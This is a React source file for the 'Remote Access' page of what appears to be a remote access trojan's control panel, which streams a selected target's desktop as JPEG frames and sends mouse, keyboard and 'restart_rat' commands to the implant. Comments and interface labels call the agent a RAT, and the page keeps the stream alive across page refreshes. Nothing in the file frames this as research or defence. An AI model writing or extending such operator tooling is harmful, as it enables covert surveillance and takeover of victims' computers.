import { useState, useEffect, useRef } from 'react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import ClientFilter from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'
import Modal from '../../UI/Modal'

// Persist key so stream survives page refresh and navigation
const LS_KEY = 'stream_state'

function loadStreamState() {
  try {
    const raw = localStorage.getItem(LS_KEY)
    if (raw) return JSON.parse(raw)
  } catch {}
  return null
}

function saveStreamState(clientId: string, fps: number, quality: number, active: boolean) {
  localStorage.setItem(LS_KEY, JSON.stringify({ clientId, fps, quality, active }))
}

function clearStreamState() {
  localStorage.removeItem(LS_KEY)
}

export default function StreamPage() {
  const { isConnected, subscribe, send } = useBridgeWebSocket()
  const { clients: cachedClients } = useDashboardStore()

  // Boot from persisted state so refresh/navigate never loses the stream
  const persisted = loadStreamState()
  const [selectedClientId, setSelectedClientId] = useState<string>(persisted?.clientId || sessionStorage.getItem('stream_clientId') || '')
  const [fps, setFps] = useState<number>(persisted?.fps ?? 60)
  const [quality, setQuality] = useState<number>(persisted?.quality ?? 100)
  const [isStreaming, setIsStreaming] = useState(persisted?.active === true)  // visual state only
  const streamingRef = useRef(persisted?.active === true)                      // track real stream state across renders
  const canvasRef = useRef<HTMLCanvasElement>(null)

  const [clients, setClients] = useState<any[]>([])
  const [restartConfirmOpen, setRestartConfirmOpen] = useState(false)

  // Keep sessionStorage in sync for other pages that read it
  useEffect(() => {
    if (selectedClientId) sessionStorage.setItem('stream_clientId', selectedClientId)
  }, [selectedClientId])

  useEffect(() => {
    if (cachedClients.length > 0) {
      setClients(cachedClients)
    }
  }, [cachedClients])

  useEffect(() => {
    if (!isConnected) return
    const unsubscribe = subscribe('db_response', (msg: any) => {
      if (msg.query === 'get_clients') setClients(msg.data)
    })
    // Real-time online/offline dot updates
    const unsubscribe2 = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setClients(msg.clients)
    })
    return () => { unsubscribe(); unsubscribe2() }
  }, [isConnected, subscribe])

  // Auto-resume stream on WS connect if we had one running before
  useEffect(() => {
    if (!isConnected) return
    const saved = loadStreamState()
    if (saved?.active && saved.clientId) {
      // Re-send start command — bridge will relay to RAT (RAT is idempotent about this)
      send({
        type: 'command',
        clientId: saved.clientId,
        command: `screenshot_stream_start fps=${saved.fps} quality=${saved.quality} width=1920 height=1080`
      })
      setSelectedClientId(saved.clientId)
      setFps(saved.fps)
      setQuality(saved.quality)
      streamingRef.current = true
    }
  }, [isConnected, send])

  // Handle incoming stream frames
  useEffect(() => {
    if (!isConnected) return
    const unsubscribe = subscribe('screenshot_stream', (msg: any) => {
      if (msg.clientId !== selectedClientId || !msg.data) return

      // Mark streaming active in UI as soon as first frame arrives
      if (!streamingRef.current) {
        streamingRef.current = true
        setIsStreaming(true)
      }

      const canvas = canvasRef.current
      if (!canvas) return
      const ctx = canvas.getContext('2d')
      if (!ctx) return

      const img = new Image()
      img.onload = () => {
        if (canvas.width !== img.width || canvas.height !== img.height) {
          canvas.width = img.width
          canvas.height = img.height
        }
        ctx.drawImage(img, 0, 0)
      }
      img.src = `data:image/jpeg;base64,${msg.data}`
    })
    return () => unsubscribe()
  }, [isConnected, subscribe, selectedClientId])

  const handleStartStream = () => {
    if (!selectedClientId) return
    streamingRef.current = true
    setIsStreaming(true)
    saveStreamState(selectedClientId, fps, quality, true)
    send({
      type: 'command',
      clientId: selectedClientId,
      command: `screenshot_stream_start fps=${fps} quality=${quality} width=1920 height=1080`
    })
  }

  const handleStopStream = () => {
    if (!selectedClientId) return
    streamingRef.current = false
    setIsStreaming(false)
    clearStreamState()
    send({
      type: 'command',
      clientId: selectedClientId,
      command: 'screenshot_stream_stop'
    })
  }

  const handleMouseEvent = (type: 'move' | 'down' | 'up', btn: 'left' | 'right', e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!isStreaming || !selectedClientId) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    
    // For drag and drop or clicks
    if (type === 'down') {
      e.preventDefault();
      canvas.focus(); // Ensure the canvas still receives keyboard focus despite preventDefault
    } else if (type === 'up') {
      e.preventDefault();
    }

    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    const x_pct = (x / rect.width) * 100;
    const y_pct = (y / rect.height) * 100;

    if (type === 'move') {
      send({ type: 'command', clientId: selectedClientId, command: `mouse_move ${x_pct.toFixed(2)} ${y_pct.toFixed(2)}` });
    } else if (type === 'down' || type === 'up') {
        send({ type: 'command', clientId: selectedClientId, command: `mouse_click ${btn} ${type} ${x_pct.toFixed(2)} ${y_pct.toFixed(2)}` });
    }
  }

  const handleKeyEvent = (type: 'down' | 'up', e: React.KeyboardEvent<HTMLCanvasElement>) => {
    if (!isStreaming || !selectedClientId) return;
    e.preventDefault();
    send({ type: 'command', clientId: selectedClientId, command: `key_press ${e.keyCode} ${type}` });
  }

  const handleFullScreen = () => {
    const canvas = canvasRef.current;
    if (canvas) {
      if (canvas.requestFullscreen) {
        canvas.requestFullscreen();
      }
    }
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-2xl font-semibold text-slate-100">Remote Access</h3>
          <p className="text-sm text-slate-400">Low-latency MJPEG desktop broadcast.</p>
        </div>
        
        <div className="flex gap-4 items-center flex-wrap">
            <label className="text-slate-300 text-sm">Target:</label>
            <ClientFilter
              clients={clients}
              value={selectedClientId}
              onChange={setSelectedClientId}
              placeholder="Select client..."
              disabled={isStreaming}
            />

            <label className="text-slate-300 text-sm">FPS:</label>
              <input type="number" min="1" max="60" value={fps} onChange={(e) => setFps(Number(e.target.value))} disabled={isStreaming} className="w-16 px-2 py-1 bg-slate-800 text-white rounded border border-slate-700"/>
            <label className="text-slate-300 text-sm">Quality:</label>
            <input type="number" min="10" max="100" value={quality} onChange={(e) => setQuality(Number(e.target.value))} disabled={isStreaming} className="w-16 px-2 py-1 bg-slate-800 text-white rounded border border-slate-700"/>

            {!isStreaming ? (
                <button onClick={handleStartStream} disabled={!selectedClientId} className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-md disabled:opacity-50">
                    Start Stream
                </button>
            ) : (
                <>
                <button onClick={handleFullScreen} className="px-4 py-2 bg-slate-600 hover:bg-slate-500 text-white rounded-md flex items-center justify-center" title="Full Screen">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4" />
                    </svg>
                </button>
                <button onClick={handleStopStream} className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-md">
                    Stop Stream
                </button>
                </>
            )}
        </div>
      </div>

      {/* Remote actions */}
      <div className="bg-slate-900 border border-slate-700 rounded-lg p-3 flex items-center gap-3 flex-wrap">
        <button
          onClick={() => setRestartConfirmOpen(true)}
          disabled={!selectedClientId}
          className="px-3 py-1.5 text-xs rounded-md bg-red-800 hover:bg-red-700 text-red-200 disabled:opacity-40"
          title="Restart the RAT process on the target machine"
        >
          Restart RAT
        </button>
      </div>

      <div className="w-full bg-black rounded-lg border border-slate-800 flex items-center justify-center overflow-hidden" style={{ minHeight: '600px' }}>
        {!isStreaming && !canvasRef.current?.width ? (
          <span className="text-slate-600">Waiting for stream...</span>
        ) : null}
        <canvas ref={canvasRef} 
            tabIndex={0}
            onMouseMove={(e) => handleMouseEvent('move', 'left', e)}
            onMouseDown={(e) => handleMouseEvent('down', e.button === 2 ? 'right' : 'left', e)}
            onMouseUp={(e) => handleMouseEvent('up', e.button === 2 ? 'right' : 'left', e)}
            onContextMenu={(e) => e.preventDefault()}
            onKeyDown={(e) => handleKeyEvent('down', e)}
            onKeyUp={(e) => handleKeyEvent('up', e)}
            className="w-full h-full object-fill cursor-crosshair focus:outline-none"
            style={{ display: isStreaming || canvasRef.current?.width ? 'block' : 'none' }}
          />
      </div>

      <Modal
        open={restartConfirmOpen}
        onClose={() => setRestartConfirmOpen(false)}
        title="Restart RAT"
      >
        <div className="space-y-4">
          <p className="text-sm text-slate-300">
            This will restart the RAT process on the target machine. It will briefly disconnect and reconnect.
          </p>
          <div className="flex items-center justify-end gap-3 pt-1">
            <button
              onClick={() => setRestartConfirmOpen(false)}
              className="px-4 py-2 text-sm rounded-md bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 transition-all"
            >
              Cancel
            </button>
            <button
              onClick={() => {
                send({ type: 'command', clientId: selectedClientId, command: 'restart_rat' })
                setRestartConfirmOpen(false)
              }}
              className="px-4 py-2 text-sm rounded-md bg-red-700 hover:bg-red-600 text-white font-medium transition-all"
            >
              Restart RAT
            </button>
          </div>
        </div>
      </Modal>
    </div>
  )
}
